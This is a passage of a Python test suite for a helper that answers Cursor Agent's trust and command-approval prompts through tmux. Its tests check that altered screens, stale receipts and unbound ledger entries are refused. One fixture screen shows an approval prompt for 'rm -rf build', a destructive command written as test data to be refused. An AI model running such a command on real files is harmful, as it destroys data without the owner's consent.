            "a changed row": ANSWERED_SCREEN.replace("this directory?", "every directory?"),
            "another path": ANSWERED_SCREEN.replace("example-task", "other-task"),
            "an extra row": box_with(ANSWERED_BOX_ROWS[:3] + ["  Allow network access too"] + ANSWERED_BOX_ROWS[3:]),
            "a missing row": box_with([row for row in ANSWERED_BOX_ROWS if "[q] Quit" not in row]),
            "the hint kept, the status row added": box_with(
                TRUST_BOX_ROWS[:10] + ["    [a] Trust this workspace", "    [q] Quit", "", STATUS_ROW] + TRUST_BOX_ROWS[12:]),
            "the status row above the last prompt row": box_with(
                TRUST_BOX_ROWS[:10] + ["    [a] Trust this workspace", STATUS_ROW, "    [q] Quit", ""]),
            "no status row": box_with([row for row in ANSWERED_BOX_ROWS if row != STATUS_ROW]),
            "the unanswered prompt itself": box_with(TRUST_BOX_ROWS),
            "two status rows": box_with(ANSWERED_BOX_ROWS + [STATUS_ROW]),
            "another status text": ANSWERED_SCREEN.replace("Trusting workspace...", "Trusting workspace\u2026"),
            "the marker on another row": box_with(moved),
            "the marker kept on its row": ANSWERED_SCREEN.replace("    [a] Trust", "  \u25b6 [a] Trust"),
            "a titled box": ANSWERED_SCREEN.replace("\u256d\u2500\u2500\u2500", "\u256d\u2500 Note \u2500", 1),
            "the status row outside the box": (box_with([row for row in ANSWERED_BOX_ROWS if row != STATUS_ROW])
                                               .replace("  Cursor Agent\n", STATUS_ROW + "\n")),
        }
        for label, screen in cases.items():
            with self.subTest(label=label):
                self.restart_case()
                self.assert_refused(self.answer_then_show(screen, approval=self.case_approval(label)), "modal-trust")

    def test_answered_box_refuses_other_screens(self):
        box = boxed(ANSWERED_BOX_ROWS)
        tail = "  Cursor Agent\n" + CURSOR_COMPOSER
        inner = boxed(["  note"])
        cases = {
            "a second trust box": (TRUST_TIP + box + boxed(TRUST_BOX_ROWS) + tail, None, "modal-trust"),
            "the answered box twice": (TRUST_TIP + box + box + tail, None, "modal-trust"),
            "a box inside the answered box": (
                TRUST_TIP + boxed(ANSWERED_BOX_ROWS[:2] + inner.splitlines() + ANSWERED_BOX_ROWS[2:]) + tail,
                None, "modal-trust"),
            "the answered box inside another box": (
                TRUST_TIP + boxed(box.splitlines(), "\u250c", "\u2510", "\u2514", "\u2518") + tail, None, "modal-trust"),
            "a command prompt below": (
                TRUST_TIP + box + "  Allow this command: git status [y] Yes [n] No\n" + CURSOR_COMPOSER,
                None, "modal-approval"),
            "a permission prompt below": (
                TRUST_TIP + box + "  Permission required to continue [a] Allow\n" + CURSOR_COMPOSER,
                None, "modal-permission"),
            "a confirmation below": (TRUST_TIP + box + "  Are you sure? (y/n)\n" + CURSOR_COMPOSER, None, "modal-unknown"),
            "a trust phrase below, outside a box": (
                TRUST_TIP + box + "  Do you trust this folder?\n" + CURSOR_COMPOSER, None, "modal-trust"),
            "a draft at the cursor": (TRUST_TIP + box + "  Cursor Agent\n> typed draft", None, "modal-trust"),
            "an idle > composer instead of Cursor's": (ANSWERED_SCREEN.replace(CURSOR_COMPOSER, ">"), None, "modal-trust"),
            "the cursor inside the box": (ANSWERED_SCREEN, 12, "modal-trust"),
            "the cursor below the box, on row 22 of 24": (ANSWERED_SCREEN, 22, "modal-trust"),
        }
        for label, (screen, cursor, kind, *visible) in cases.items():
            with self.subTest(label=label):
                self.restart_case()
                after = self.answer_then_show(screen, approval=self.case_approval(label), cursor=cursor,
                                              visible=(visible or [None])[0])
                self.assert_refused(after, kind)
        with self.subTest(label="the visible screen cannot be located"):
            self.restart_case()
            self.answer_then_show(ANSWERED_SCREEN, approval=self.case_approval("not located"))
            self.env["FAKE_HISTORY"] = "3"
            self.assert_refused(self.inspect_now(), "modal-trust")

    def test_answered_box_receipt_and_pane_changes_still_refuse(self):
        after = self.answer_then_show(ANSWERED_SCREEN)
        self.assertEqual(after["classification"], "unclassified")
        self.screen("older output\n" * 11 + ANSWERED_SCREEN.replace("Cursor Agent", "Cursor Agent 2"), visible=24)
        code, stale = self.reply_to(after["receipt"], "--submit", "--observed-ready")
        self.assertEqual((code, stale["state"]), (2, "stale-receipt"))
        self.screen("older output\n" * 11 + ANSWERED_SCREEN, visible=24)
        newer = self.inspect_now()
        for mode in ("replaced", "new-pane", "foreign-path", "foreign-owner"):
            with self.subTest(mode=mode):
                self.text_path.write_text("continue")
                code, refused = self.invoke("reply", ["--receipt", newer["receipt"], "--text-file", str(self.text_path),
                                                      "--submit", "--observed-ready"], mode=mode)
                self.assertEqual(code, 2)
                self.assertIn(refused["state"], {"pane-replaced", "not-owned"})
        self.assertEqual(len(self.sends()), 1)

    # A legacy ledger entry (OP399 SK3): written before format 2 (5bf24fec and earlier), it binds
    # the box only by expected_text_sha256. --answered-text-file supplies that exact file;
    # nothing is written.

    def make_legacy(self, approval=APPROVAL, change=None):
        """Answer, then rewrite the ledger entry and the state record to the pre-format-2 fields."""
        self.answer_then_show(ANSWERED_SCREEN, approval=approval)
        entry = {key: value for key, value in json.loads(self.ledger(approval).read_text()).items()
                 if key in OLD_LEDGER_FIELDS}
        entry = change(entry) if change else entry
        self.ledger(approval).write_text(json.dumps(entry))
        state = self.state()
        state["answers"][-1] = {key: value for key, value in entry.items() if key != "name"}
        (self.root / "state" / "cursor-interactive-session" / self.name).write_text(json.dumps(state))

    def with_text(self, path, *flags):
        return ["--answered-text-file", str(path), *flags]

    def assert_unaccepted(self, path):
        code, refused = self.invoke("inspect", self.with_text(path))
        self.assertEqual((code, refused["state"]), (2, "answered-text-unaccepted"))
        before = len(self.sends())
        receipt = self.inspect_now()["receipt"]
        code, refused = self.reply_to(receipt, *self.with_text(path, "--submit", "--observed-ready"))
        self.assertEqual((code, refused["state"]), (2, "answered-text-unaccepted"))
        self.assertEqual(len(self.sends()), before)

    def test_legacy_entry_with_its_answered_text_file(self):
        self.make_legacy()
        ledger, answers = self.ledger().read_bytes(), self.state()["answers"]
        # Without the file a legacy entry is not evidence.
        self.assert_refused(self.inspect_now(), "modal-trust")
        code, after = self.invoke("inspect", self.with_text(self.expect_path))
        self.assertEqual((code, after["classification"]), (0, "unclassified"))
        self.assertIn(APPROVAL, after["classification_detail"])
        # A reply without the file would classify differently from this inspect.
        code, refused = self.reply_to(after["receipt"], "--submit", "--observed-ready")
        self.assertEqual((code, refused["state"]), (2, "stale-receipt"))
        code, refused = self.reply_to(after["receipt"], *self.with_text(self.expect_path, "--submit"))
        self.assertEqual((code, refused["state"]), (2, "unclassified-ui"))
        code, sent = self.reply_to(after["receipt"], *self.with_text(self.expect_path, "--submit", "--observed-ready"))
        self.assertEqual((code, sent["state"], sent["classification"]), (0, "sent", "unclassified"))
        self.assertEqual(self.sends()[-2:], [["send-keys", "-t", "%7", "-l", "--", "continue"],
                                             ["send-keys", "-t", "%7", "Enter"]])
        # Read only: the ledger and the recorded answers are untouched.
        self.assertEqual((self.ledger().read_bytes(), self.state()["answers"]), (ledger, answers))

    def test_reply_needs_the_evidence_its_inspect_used(self):
        # Review of a8a54c4d: a receipt from an inspect that counted the box as a prompt
        # must not carry a reply that does not count it.
        self.make_legacy()
        plain = self.inspect_now()
        self.assertEqual(plain["classification"], "modal-trust")
        code, refused = self.reply_to(plain["receipt"], *self.with_text(self.expect_path, "--submit", "--observed-ready"))
        self.assertEqual((code, refused["state"]), (2, "stale-receipt"))
        self.assertEqual(len(self.sends()), 1)
        state = self.state()
        self.assertEqual((state["receipt_answered"], state["receipt_id"]),
                         ("none", helper.parse_receipt(plain["receipt"])["id"]))

    # The answered box across history and the visible screen (OP399 SK3, the frozen G1
    # capture): its top in history, its status row and bottom on the visible screen.

    def live_capture(self, capture=None):
        """The live capture as tmux prints it, with the live worktree replaced by this test's."""
        return (LIVE["capture"] if capture is None else capture).replace(LIVE["identity"]["worktree"], self.worktree) + "\n"

    def show(self, capture, visible=24):
        self.screen(capture, visible=visible)

    def test_live_box_across_history_is_answered(self):
        with self.subTest(label="a format-2 entry"):
            after = self.answer_then_show(self.live_capture(), approval=self.case_approval("live format 2"),
                                          history=0, visible=24)
            self.assertEqual((after["classification"], self.env["FAKE_HISTORY"]), ("unclassified", "11"))
            self.assertIn(self.case_approval("live format 2"), after["classification_detail"])
            code, sent = self.reply_to(after["receipt"], "--submit", "--observed-ready")
            self.assertEqual((code, sent["state"]), (0, "sent"))
        with self.subTest(label="a legacy entry with its answered text file"):
            self.restart_case()
            self.make_legacy(self.case_approval("live legacy"))
            self.show(self.live_capture())
            self.assert_refused(self.inspect_now(), "modal-trust")
            code, after = self.invoke("inspect", self.with_text(self.expect_path))
            self.assertEqual((code, after["classification"]), (0, "unclassified"))
            code, sent = self.reply_to(after["receipt"], *self.with_text(self.expect_path, "--submit", "--observed-ready"))
            self.assertEqual((code, sent["state"]), (0, "sent"))

    def test_live_box_across_history_refuses_other_captures(self):
        live = LIVE["capture"]
        rows = live.split("\n")
        box = "\n".join(rows[2:19]) + "\n"

        def with_rows(changes):
            changed = list(rows)
            for index, row in changes.items():
                changed[index] = row
            return "\n".join(changed)

        def tall(dropped):
            """A 70-row pane under 20 history rows: 90 capture rows, the first 10 past the
            80-row bound. The live box starts at capture row `dropped`."""
            kept = ["older output"] * dropped + rows[2:19]
            return "\n".join(kept + [""] * (88 - len(kept)) + ["  " + CURSOR_COMPOSER, ""])

        cases = {
            "the box bottom in history, a trust row visible": (
                with_rows({27: "  [a] Trust this workspace"}), 15, "modal-trust"),
            "a second box in history": (box + live, 24, "modal-trust"),
            "a prompt phrase elsewhere in history": ("  Allow this command: git push\n" + live, 24, "modal-trust"),
            "a trust phrase elsewhere in history": ("  Do you trust this folder?\n" + live, 24, "modal-trust"),
            "an active new prompt below the box": (
                with_rows({26: "  Allow this command: rm -rf build", 27: "  [y] Yes [n] No"}), 24, "modal-approval"),
            "a second prompt on the visible screen": (live.replace("  the cost.", "  Are you sure? (y/n)"), 24, "modal-unknown"),
        }
        for label, (capture, visible, kind) in cases.items():
            with self.subTest(label=label):
                self.restart_case()
                after = self.answer_then_show(self.live_capture(capture), approval=self.case_approval(label),
                                              history=0, visible=visible)
                self.assert_refused(after, kind)
        for label, dropped, kind in (("truncated: the box top on the first kept row", 10, "modal-trust"),
                                     ("the box partly past the 80-row bound", 9, "modal-trust"),
                                     ("truncated: the box below the first kept row", 11, "unclassified")):
            with self.subTest(label=label):
                self.restart_case()
                after = self.answer_then_show(self.live_capture(tall(dropped)), approval=self.case_approval(label),
                                              history=0, visible=70)
                self.assertEqual((after["truncated"], self.env["FAKE_HISTORY"]), (True, "20"))
                if kind == "unclassified":
                    self.assertEqual(after["classification"], kind)
                else:
                    self.assert_refused(after, kind)

    def test_live_box_history_row_is_bound_by_the_receipt(self):
        after = self.answer_then_show(self.live_capture(), history=0, visible=24)
        self.assertEqual(after["classification"], "unclassified")
        self.show(self.live_capture().replace("Tip: You can start", "Tip: You may start"))
        code, stale = self.reply_to(after["receipt"], "--submit", "--observed-ready")
        self.assertEqual((code, stale["state"]), (2, "stale-receipt"))
        self.assertEqual(len(self.sends()), 1)

    def test_ledger_entry_must_be_a_regular_file(self):
        # Review of a8a54c4d: never block on, or follow, something other than the entry.
        for label in ("a FIFO", "a symlink to a copy of the entry"):
            with self.subTest(label=label):
                self.restart_case()
                approval = self.case_approval(label)
                self.answer_then_show(ANSWERED_SCREEN, approval=approval)
                ledger = self.ledger(approval)
                copy = self.root / ("ledger-copy-" + approval)
                copy.write_bytes(ledger.read_bytes())
                ledger.unlink()
                if label == "a FIFO":
                    os.mkfifo(ledger, 0o600)
                else:
                    ledger.symlink_to(copy)
                self.assert_refused(self.inspect_now(), "modal-trust")

    def test_answered_text_file_must_bind_the_legacy_entry(self):
        edits = {
            "another pane": {"pane_id": "%8"},
            "another pid": {"pane_pid": "999"},
            "another owner": {"owner": "ci1-" + "0" * 32},
            "another task name": {"name": "task-unique-2"},
            "a trust path that is not the worktree": {"trust_path": str(self.root / "other-task")},
            "an outcome other than sent": {"outcome": "uncertain"},
            "another kind": {"kind": "modal-approval"},
            "a format-2 field in a legacy entry": {"worktree": self.worktree},
        }
        for label, fields in edits.items():
            with self.subTest(label=label):
                self.restart_case()
                self.make_legacy(self.case_approval(label), lambda entry: dict(entry, **fields))
                self.assert_unaccepted(self.expect_path)
        variants = {
            "a hash mismatch, the same rows": self.fix(TRUST_EXPECT) + "\n",
            "a hash mismatch, other rows": self.fix(TRUST_EXPECT).replace("[q] Quit", "[q] Quit now"),
        }
        for label, text in variants.items():
            with self.subTest(label=label):
                self.restart_case()
                self.make_legacy(self.case_approval(label))
                other = self.root / "answered-variant"
                other.write_text(text)
                self.assert_unaccepted(other)
        with self.subTest(label="not the task's last answer"):
            self.restart_case()
            approval = self.case_approval("not last")
            self.make_legacy(approval)
            state = self.state()
            state["answers"].append(dict(state["answers"][-1], approval_ref=SECOND_APPROVAL, outcome="not-sent"))
            (self.root / "state" / "cursor-interactive-session" / self.name).write_text(json.dumps(state))
            self.assert_unaccepted(self.expect_path)
        with self.subTest(label="the ledger and the state record disagree"):
            self.restart_case()
            approval = self.case_approval("disagree")
            self.make_legacy(approval)
            self.edit_ledger(approval, lambda entry: dict(entry, answered_at="2026-11-05T00:00:00Z"))
            self.assert_unaccepted(self.expect_path)
        with self.subTest(label="a format-2 entry with a conflicting file"):
            self.restart_case()
            self.answer_then_show(ANSWERED_SCREEN, approval=self.case_approval("format 2 conflict"))
            other = self.root / "answered-conflict"
            other.write_text(self.fix(TRUST_EXPECT) + "\n")
            self.assert_unaccepted(other)
        with self.subTest(label="a format-2 entry with its own file"):
            self.restart_case()
            self.answer_then_show(ANSWERED_SCREEN, approval=self.case_approval("format 2 same"))
            code, after = self.invoke("inspect", self.with_text(self.expect_path))
            self.assertEqual((code, after["classification"]), (0, "unclassified"))

    def test_answered_text_file_input_limits(self):
        self.make_legacy()
        cases = {
            "a missing file": self.root / "absent",
            "over 4096 bytes": b"[a] Trust this workspace\n" + b"x" * 4097,
            "over 20 lines": b"[a] Trust this workspace\n" * 21,
            "a control character": b"[a] Trust this workspace\x1b[2J\n",
        }
        for label, data in cases.items():
            with self.subTest(label=label):
                path = data if isinstance(data, Path) else self.root / ("answered-" + label.replace(" ", "-"))
                if not isinstance(data, Path):
                    path.write_bytes(data)
                self.log.write_text("")
                code, refused = self.invoke("inspect", self.with_text(path))
                self.assertEqual((code, refused["state"]), (2, "invalid-input"))
                self.text_path.write_text("continue")
                code, refused = self.invoke("reply", ["--receipt", "v1:" + "0" * 32 + ":" + "0" * 64 + ":%7:123",
                                                      "--text-file", str(self.text_path), *self.with_text(path)])
                self.assertEqual((code, refused["state"]), (2, "invalid-input"))
                self.assertEqual(self.commands("tmux"), [])

    def test_answered_text_file_does_not_loosen_the_box_rules(self):
        cases = {
            "a changed row": (ANSWERED_SCREEN.replace("this directory?", "every directory?"), "modal-trust"),
            "no status row": (ANSWERED_SCREEN.replace(STATUS_ROW.strip(), "x" * len(STATUS_ROW.strip())), "modal-trust"),
            "a command prompt below": (ANSWERED_SCREEN.replace("\n  Cursor Agent\n", "\n  Allow this command: git status\n"),
                                       "modal-approval"),
            "a draft at the cursor": (ANSWERED_SCREEN.replace(CURSOR_COMPOSER, "> typed draft"), "modal-trust"),
        }
        for label, (screen, kind) in cases.items():
            with self.subTest(label=label):
                self.restart_case()
                self.make_legacy(self.case_approval(label))
                self.screen("older output\n" * 11 + screen, visible=len(screen.splitlines()))
                code, after = self.invoke("inspect", self.with_text(self.expect_path))
                self.assertEqual((code, after["classification"]), (0, kind))
                before = len(self.sends())
                code, refused = self.reply_to(after["receipt"], *self.with_text(self.expect_path, "--submit",
                                                                                "--observed-ready"))
                self.assertEqual((code, refused["state"]), (2, kind))
                self.assertEqual(len(self.sends()), before)

    # Cursor's command-approval prompt (OP399 SK3, 2026-11-05T19:30:52Z): answer binds it under
    # its divider and may send only y, Run (once).

    def command_screen(self, rows=None):
        """The command-prompt capture as tmux prints it: one newline after each row."""
        self.screen("\n".join(COMMAND_ROWS if rows is None else rows) + "\n", visible=24)

    def command_expect(self, text=None):
        path = self.root / "expect-command"
        path.write_text(COMMAND["expectedText"] if text is None else text)
        return path

    def answer_command(self, receipt, choice="y", text=None, approval=APPROVAL):
        return self.invoke("answer", self.answer_args(receipt, choice=choice, kind="modal-approval", approval=approval,
                                                      expect=self.command_expect(text)))

    def command_rows(self, changes=None, drop=(), insert=None):
        rows = list(COMMAND_ROWS)
        for index, row in (changes or {}).items():
            rows[index] = row
        for index in sorted(drop, reverse=True):
            del rows[index]
            rows.append("")
        for index, row in (insert or {}).items():
            rows.insert(index, row)
            if rows[-1] == "":
                del rows[-1]
            else:
                del rows[0]
        self.assertEqual(len(rows), len(COMMAND_ROWS))
        return rows

    def review_footer_screen(self, rows=None):
        self.screen("\n".join(REVIEW_FOOTER_ROWS if rows is None else rows) + "\n", visible=24, cursor=23)

    def test_skip_opens_reason_without_enter_or_command_approval(self):
        self.review_footer_screen()
        inspected = self.start_and_inspect()
        code, answered = self.answer_command(inspected["receipt"], choice="skip",
                                             text=REVIEW_FOOTER["expectedText"])
        self.assertEqual((code, answered["state"]), (0, "answered"), answered)
        self.assertEqual(self.sends(), [["send-keys", "-t", "%7", "-l", "--", "n"]])
        self.answer_command(inspected["receipt"], choice="skip", text=REVIEW_FOOTER["expectedText"])
        self.assertEqual(len(self.sends()), 1)

    def test_skip_refuses_queue_error_and_noncanonical_shell(self):
        cases = [(QUEUE["capture"], QUEUE["expectedText"]),
                 (REVIEW_ERROR["capture"], REVIEW_ERROR["expectedText"]),
                 (REVIEW_FOOTER["capture"].replace("Run this command?", "Run this MCP tool?"),
                  REVIEW_FOOTER["expectedText"].replace("Run this command?", "Run this MCP tool?"))]
        for capture, text in cases:
            with self.subTest(text=text):
                self.restart_case()
                self.screen(capture, visible=24, cursor=23)
                inspected = self.start_and_inspect()
                code, refused = self.answer_command(inspected["receipt"], choice="skip", text=text)
                self.assertEqual(code, 2, refused)
                self.assertEqual(self.sends(), [])
                self.assertFalse(self.ledger().exists())

    def prepare_feedback(self):
        self.feedback_case = getattr(self, "feedback_case", 0) + 1
        self.feedback_ref = self.case_approval("feedback " + str(self.feedback_case))
        self.env["FAKE_WIDTH"] = "80"
        self.review_footer_screen()
        inspected = self.start_and_inspect()
        code, answered = self.answer_command(inspected["receipt"], choice="skip",
                                             text=REVIEW_FOOTER["expectedText"], approval=self.feedback_ref)
        self.assertEqual(code, 0, answered)
        self.screen("Waiting for approval...\n\n  → " + helper.REASON_PLACEHOLDER +
                    "\n\n  Grok 4.7 · 10%\n  ~/example-task\n", visible=6)
        self.env["FAKE_WIDTH"] = "240"
        self.env["FAKE_ECHO_ROW"] = "2"
        return self.inspect_now()

    def test_feedback_uncertain_skip_blocks_generic_reply(self):
        self.review_footer_screen()
        inspected = self.start_and_inspect()
        reason = self.root / "reason-after-n"
        reason.write_text("\n\n  → " + helper.REASON_PLACEHOLDER + "\n\n\n\n")
        code, refused = self.invoke("answer", self.answer_args(inspected["receipt"], choice="skip",
            kind="modal-approval", expect=self.command_expect(REVIEW_FOOTER["expectedText"])),
            env={"FAKE_ON_N": str(reason), "FAKE_N_FAIL": "1"})
        self.assertEqual((code, refused["state"]), (3, "answer-unconfirmed"))
        self.env.update(FAKE_HEIGHT="6", FAKE_HISTORY="0", FAKE_CURSOR_Y="5", FAKE_WIDTH="240", FAKE_ECHO_ROW="2")
        inspected = self.inspect_now()
        before = list(self.sends())
        self.text_path.write_text("Read the correction file.")
        code, refused = self.invoke("reply", ["--receipt", inspected["receipt"], "--text-file", str(self.text_path),
                                             "--observed-ready", "--submit"])
        self.assertEqual((code, refused["state"]), (2, "feedback-required"), refused)
        self.assertEqual(self.sends(), before)

    def feedback(self, receipt, text="Read RELAY-QA-FINDINGS.md; fix per-measure matching and exact decimal equality.", **kwargs):
        self.text_path.write_text(text)
        return self.invoke("feedback", ["--receipt", receipt, "--skip-ref", self.feedback_ref,
                                       "--text-file", str(self.text_path)], **kwargs)

    def test_feedback_echoes_full_reason_and_submits_once(self):
        inspected = self.prepare_feedback()
        code, sent = self.feedback(inspected["receipt"])
        self.assertEqual((code, sent["state"]), (0, "feedback-submitted"), sent)
        self.assertEqual(self.sends(), [["send-keys", "-t", "%7", "-l", "--", "n"],
            ["send-keys", "-t", "%7", "-l", "--", self.text_path.read_text()],
            ["send-keys", "-t", "%7", "Enter"]])
        self.feedback(self.inspect_now()["receipt"])
        self.assertEqual(len(self.sends()), 3)

    def test_feedback_requires_latest_successful_skip_ledger(self):
        changes = {"wrong choice": lambda e: dict(e, choice="y"),
                   "uncertain": lambda e: dict(e, outcome="uncertain"),
                   "wrong owner": lambda e: dict(e, owner="other"),
                   "wrong worktree": lambda e: dict(e, worktree="/other"),
                   "changed command digest": lambda e: dict(e, expected_text_sha256="0" * 64)}
        for label, change in changes.items():
            with self.subTest(label=label):
                self.restart_case()
                inspected = self.prepare_feedback()
                self.edit_ledger(self.feedback_ref, change)
                before = list(self.sends())
                code, refused = self.feedback(inspected["receipt"])
                self.assertEqual((code, refused["state"]), (2, "feedback-unbound"), refused)
                self.assertEqual(self.sends(), before)

    def test_feedback_refuses_generic_reply_and_stale_custody(self):
        inspected = self.prepare_feedback()
        self.text_path.write_text("Do the correction.")
        before = list(self.sends())
        code, refused = self.invoke("reply", ["--receipt", inspected["receipt"], "--text-file", str(self.text_path),
                                             "--observed-ready", "--submit"])
        self.assertEqual((code, refused["state"]), (2, "feedback-required"))
        for mode in ("foreign-owner", "replaced", "foreign-path"):
            code, refused = self.feedback(inspected["receipt"], mode=mode)
            self.assertEqual(code, 2, refused)
        self.capture.write_text(self.capture.read_text().replace("10%", "11%"))
        code, refused = self.feedback(inspected["receipt"])
        self.assertEqual((code, refused["state"]), (2, "stale-receipt"))
        self.assertEqual(self.sends(), before)

    def test_feedback_refuses_draft_history_queue_and_wrong_field(self):
        mutations = [lambda s: s.replace(helper.REASON_PLACEHOLDER, "Add a follow-up"),
                     lambda s: s.replace(helper.REASON_PLACEHOLDER, "already typed"),
                     lambda s: s.replace("Waiting for approval...", "┌─ follow-ups ─┐"),
                     lambda s: s.replace("Waiting for approval...", "enter send now · ↑ select/edit · esc cancel"),
                     lambda s: s.replace("Waiting for approval...", "Run this command?"),
                     lambda s: s.replace("Waiting for approval...", "Error: Agent stopped retrying"),
                     lambda s: s.replace("Waiting for approval...", "→ copied placeholder")]
        for mutate in mutations:
            with self.subTest(mutate=mutate):
                self.restart_case()
                self.prepare_feedback()
                self.screen(mutate(self.capture.read_text()), visible=6)
                inspected = self.inspect_now()
                before = list(self.sends())
                code, refused = self.feedback(inspected["receipt"])
                self.assertEqual(code, 2, refused)
                self.assertEqual(self.sends(), before)

    def test_feedback_never_enters_on_wrong_missing_or_intervening_echo(self):
        cases = [{"FAKE_ECHO": "0"}, {"FAKE_ECHO_ROW": "1"},
                 {"FAKE_ECHO_QUEUE": "1"}, {"FAKE_ECHO_MODAL": "1"}]
        for env in cases:
            with self.subTest(env=env):
                self.restart_case()
                inspected = self.prepare_feedback()
                code, refused = self.feedback(inspected["receipt"], env=env)
                self.assertEqual((code, refused["state"]), (3, "feedback-unconfirmed"), refused)
                self.assertFalse(any(row[-1] == "Enter" for row in self.sends()))
                before = list(self.sends())
                self.feedback(self.inspect_now()["receipt"])
                self.assertEqual(self.sends(), before)

    def test_feedback_placeholder_text_is_never_its_own_echo(self):
        for reason in (helper.REASON_PLACEHOLDER, helper.REASON_PLACEHOLDER + "  ctrl+c to stop"):
            with self.subTest(reason=reason):
                self.restart_case()
                inspected = self.prepare_feedback()
                code, refused = self.feedback(inspected["receipt"], text=reason, env={"FAKE_ECHO": "0"})
                self.assertEqual((code, refused["state"]), (3, "feedback-unconfirmed"), refused)
                self.assertFalse(any(row[-1] == "Enter" for row in self.sends()))

    def test_feedback_delayed_echo_and_failed_sends_stay_one_shot(self):
        inspected = self.prepare_feedback()
        code, sent = self.feedback(inspected["receipt"], env={"FAKE_ECHO_DELAY": "0.6"})
        self.assertEqual((code, sent["state"]), (0, "feedback-submitted"), sent)
        for mode, env in (("send-fail", {}), ("", {"FAKE_ENTER_FAIL": "1"})):
            self.restart_case()
            inspected = self.prepare_feedback()
            code, refused = self.feedback(inspected["receipt"], mode=mode, env=env)
            self.assertEqual((code, refused["state"]), (3, "feedback-unconfirmed"), refused)
            before = list(self.sends())
            self.feedback(self.inspect_now()["receipt"])
            self.assertEqual(self.sends(), before)
            self.text_path.write_text("Do the correction.")
            code, refused = self.invoke("reply", ["--receipt", self.inspect_now()["receipt"],
                "--text-file", str(self.text_path), "--observed-ready", "--submit"])
            self.assertEqual((code, refused["state"]), (2, "feedback-required"))
            self.assertEqual(self.sends(), before)

    def test_feedback_retains_short_single_row_input_contract(self):
        inspected = self.prepare_feedback()
        before = list(self.sends())
        for reason in ("x" * 201, "a\nb", "Run this command?", "", "\x1btest", "界", " padded "):
            code, refused = self.feedback(inspected["receipt"], text=reason)
            self.assertEqual((code, refused["state"]), (2, "invalid-input"), refused)
        self.env["FAKE_WIDTH"] = "40"
        inspected = self.inspect_now()
        code, refused = self.feedback(inspected["receipt"])
        self.assertEqual((code, refused["state"]), (2, "invalid-input"), refused)
        self.assertEqual(self.sends(), before)

    def long_rejection_fixture(self):
        return json.loads((SCRIPT.parent / "cursor-interactive-session-fixtures" /
                           "command-long-pr-rejection.json").read_text())

    def test_long_command_rejection_requires_complete_current_screen(self):
        fixture = self.long_rejection_fixture()
        self.assertEqual(__import__("hashlib").sha256(fixture["capture"].encode()).hexdigest(),
                         fixture["captureSha256"])
        self.assertEqual(len([r for r in fixture["expectedText"].splitlines() if r.strip()]), 32)
        # Actual retained viewport: the start of the command is in history.
        self.screen(fixture["capture"], visible=24, cursor=23)
        inspected = self.start_and_inspect()
        code, refused = self.answer_command(inspected["receipt"], choice="ctrl-c",
                                            text=fixture["expectedText"])
        self.assertEqual((code, refused["state"]), (2, "stale-prompt"), refused)
        self.assertEqual(self.sends(), [])
        self.assertFalse(self.ledger().exists())
        # Synthetic larger viewport, NOT a claim that the live pane was resized.
        self.screen(fixture["capture"], visible=48, cursor=47)
        code, inspected = self.invoke("inspect")
        self.assertEqual(code, 0)
        code, answered = self.answer_command(inspected["receipt"], choice="ctrl-c",
                                             text=fixture["expectedText"])
        self.assertEqual((code, answered["state"]), (0, "answered"), answered)
        self.assertEqual(self.sends(), [["send-keys", "-t", "%7", "C-c"]])
        self.answer_command(inspected["receipt"], choice="ctrl-c", text=fixture["expectedText"])
        self.assertEqual(len(self.sends()), 1)

    def test_long_command_never_expands_approval_or_other_kind_limits(self):
        fixture = self.long_rejection_fixture()
        self.screen(fixture["capture"], visible=48, cursor=47)
        inspected = self.start_and_inspect()
        for choice, kind in (("y", "modal-approval"), ("ctrl-c", "modal-trust"),
                             ("ctrl-c", "modal-permission")):
            with self.subTest(choice=choice, kind=kind):
                code, refused = self.invoke("answer", self.answer_args(inspected["receipt"], choice=choice,
                    kind=kind, expect=self.command_expect(fixture["expectedText"])))
                self.assertEqual((code, refused["state"]), (2, "invalid-input"), refused)
        self.assertEqual(self.sends(), [])
        self.assertFalse(self.ledger().exists())

    def test_long_rejection_retains_byte_and_line_bounds(self):
        fixture = self.long_rejection_fixture()
        self.screen(fixture["capture"], visible=48, cursor=47)
        inspected = self.start_and_inspect()
        for text in ("x\n" * 65, "x" * 4097):
            code, refused = self.answer_command(inspected["receipt"], choice="ctrl-c", text=text)
            self.assertEqual((code, refused["state"]), (2, "invalid-input"), refused)
        self.assertEqual(self.sends(), [])
        self.assertFalse(self.ledger().exists())

    def test_review_footer_capture_sends_only_one_literal_y(self):
        fixture = REVIEW_FOOTER
        self.assertEqual(__import__("hashlib").sha256(fixture["capture"].encode()).hexdigest(), fixture["captureSha256"])
        self.assertEqual(len(REVIEW_FOOTER_ROWS), fixture["geometry"]["history_size"] + 24)
        self.assertEqual(REVIEW_FOOTER_ROWS[-2], " " * 48 + "ctrl+r to review changed files")
        self.review_footer_screen()
        inspected = self.start_and_inspect()
        code, answered = self.answer_command(inspected["receipt"], text=fixture["expectedText"])
        self.assertEqual((code, answered["state"]), (0, "answered"), answered.get("detail"))
        self.assertEqual(self.sends(), [["send-keys", "-t", "%7", "-l", "--", "y"]])
        self.assertEqual(json.loads(self.ledger().read_text())["outcome"], "sent")
        self.answer_command(inspected["receipt"], text=fixture["expectedText"])
        self.assertEqual(len(self.sends()), 1)

    def test_review_footer_is_exact_ascii_padded_ui_chrome_only(self):
        footer = "ctrl+r to review changed files"
        # Full captured modal, not a minimal synthetic box. Only mutate its tail.
        tails = {
            "changed case": [footer.upper()], "changed key": [footer.replace("r", "s", 1)],
            "changed text": [footer + " now"], "prefix": ["extra " + footer],
            "wrapped": ["ctrl+r to review", "changed files"], "duplicate": [footer, footer],
            "nbsp": ["\u00a0" + footer], "tab": ["\t" + footer],
            "box padding": ["\u2502 " + footer], "box after": [footer + " \u2502"],
            "extra row": [footer, "queued: git push"],
            "error and hint": ["Error: Agent stopped retrying", footer],
        }
        for label, tail in tails.items():
            with self.subTest(label=label):
                self.restart_case()
                self.review_footer_screen(REVIEW_FOOTER_ROWS[:-3] + tail + [""])
                inspected = self.start_and_inspect()
                approval = self.case_approval(label)
                code, refused = self.answer_command(inspected["receipt"], text=REVIEW_FOOTER["expectedText"], approval=approval)
                self.assertEqual((code, refused["state"]), (2, "prompt-unclear"))
                self.assertEqual(self.sends(), [])
                self.assertFalse(self.ledger(approval).exists())

    def test_review_footer_cannot_rescue_an_unbound_command(self):
        rows = REVIEW_FOOTER_ROWS
        first = len(rows) - 24
        changes = {
            "command changed": {first + 11: rows[first + 11].replace("date", "echo")},
            "path changed": {first + 12: rows[first + 12].replace("example-regression", "different-worktree")},
            "divider changed": {first + 10: "-" * 80},
